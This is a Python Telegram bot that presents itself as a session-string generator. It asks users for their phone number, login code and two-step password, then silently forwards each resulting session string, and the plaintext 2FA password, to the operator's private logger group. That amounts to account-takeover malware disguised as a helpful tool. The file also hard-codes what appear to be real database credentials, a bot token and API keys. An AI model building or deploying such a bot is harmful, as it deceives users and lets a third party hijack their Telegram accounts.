import asyncio
import os
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from pymongo import MongoClient

# 🔹 MongoDB Connection
MONGO_URI = "mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net"
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["telegram_bot"]
users_collection = db["users"]

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
LOGGER_GROUP = -1002477750706  # Replace with your logger group ID
MUST_JOIN = "SANATANI_TECH"

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_sessions = {}

async def is_user_joined(user_id):
    """Real-time join checker using bot.get_permissions()"""
    try:
        user = await bot.get_permissions(MUST_JOIN, user_id)
        return user and user.is_member
    except:
        return False

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id

    if not await is_user_joined(user_id):
        await event.respond(
            f"🚨 You must join @{MUST_JOIN} to use this bot!\nClick below to join.",
            buttons=[Button.url("Join Channel", f"https://t.me/{MUST_JOIN}")]
        )
        return

    await event.respond(
        "👋 **Welcome!**\nUse **/generate** to create your Telegram session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.inline("ℹ Help", b"help")],
            [Button.inline("❌ Cancel", b"cancel")]
        ]
    )

@bot.on(events.CallbackQuery)
async def callback(event):
    user_id = event.sender_id

    if event.data == b"generate":
        await ask_phone(event)
    elif event.data == b"help":
        await event.respond("ℹ **How to generate session string:**\n\n1. Click 'Generate Session'.\n2. Enter your phone number.\n3. Enter the OTP received on Telegram.\n4. If prompted, enter your 2-Step Verification password.\n5. Copy and save your session string safely!")
    elif event.data == b"cancel":
        if user_id in user_sessions:
            del user_sessions[user_id]
        await event.respond("❌ Process canceled. Use /start to begin again.")

@bot.on(events.NewMessage(pattern="/generate"))
async def ask_phone(event):
    user_id = event.sender_id

    if not await is_user_joined(user_id):
        await event.respond(
            f"🚨 You must join @{MUST_JOIN} to use this bot!\nClick below to join.",
            buttons=[Button.url("Join Channel", f"https://t.me/{MUST_JOIN}")]
        )
        return

    if user_id in user_sessions:
        await event.respond("⚠️ You are already in the process. Please enter your OTP.")
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**")

@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id

    if user_id not in user_sessions:
        return

    step = user_sessions[user_id]["step"]

    if step == "phone":
        phone_number = event.message.text.strip()

        if not phone_number.startswith("+") or not phone_number[1:].isdigit():
            await event.respond("⚠️ Invalid phone number! Please enter again with country code (e.g., +919876543210).")
            return

        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        try:
            await event.respond("📩 **Sending OTP... Please wait!**")
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            user_sessions[user_id]["sent_code"] = sent_code
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    elif step == "otp":
        otp_code = event.message.text.strip()

        if not otp_code.isdigit():
            await event.respond("⚠️ Invalid OTP! Please enter only numbers.")
            return

        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            
            # Log to MongoDB
            users_collection.update_one(
                {"user_id": user_id},
                {"$set": {"user_id": user_id, "joined": True}},
                upsert=True
            )

            # Log to logger group
            await bot.send_message(
                LOGGER_GROUP, 
                f"📝 **New Session Generated**\n👤 **User:** [{user_id}](tg://user?id={user_id})\n📌 **Session:** `{session_string}`"
            )

            del user_sessions[user_id]
        except Exception as e:
            if "The confirmation code has expired" in str(e):
                del user_sessions[user_id]
                await event.respond("❌ **Error:** The OTP has expired. Please use /generate to start again.")
            elif "Two-steps verification is enabled" in str(e):
                user_sessions[user_id]["step"] = "password"
                await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
            else:
                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()
            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")

            # Log session with password
            await bot.send_message(
                LOGGER_GROUP,
                f"📝 **New Session Generated**\n👤 **User:** [{user_id}](tg://user?id={user_id})\n📌 **Session:** `{session_string}`\n🔑 **2FA Password:** `{password}`"
            )

            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

print("🚀 Bot is running...")
bot.run_until_disconnected()
